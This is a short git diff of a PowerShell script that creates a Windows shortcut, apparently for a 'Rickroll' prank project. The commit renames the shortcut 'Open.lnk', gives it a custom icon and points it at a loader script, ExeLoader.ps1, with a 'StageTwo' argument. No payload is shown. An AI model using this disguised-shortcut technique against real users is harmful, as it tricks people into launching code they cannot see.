b65f64e065e8d9013e7d2749a532c86fbd5db251
CoreByte <62032154+CoreBytee@users.noreply.github.com>
2021-05-30 12:10:43 +0200

    Update ShortcutTest.ps1

--- Tools/ShortcutTest.ps1
+++ Tools/ShortcutTest.ps1
@@ -1,6 +1,6 @@
 $shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut("./shortcut.lnk")
+$shortcut = $shell.CreateShortcut("./Open.lnk")
 $shortcut.IconLocation = "C:\Users\Huiswerk\Desktop\Rickroll\ProgramIcon.ico"
-$shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
-$shortcut.Arguments = "/c pause"
+$shortcut.TargetPath = "./ExeLoader.ps1"
+$shortcut.Arguments = "StageTwo"
 $shortcut.Save()
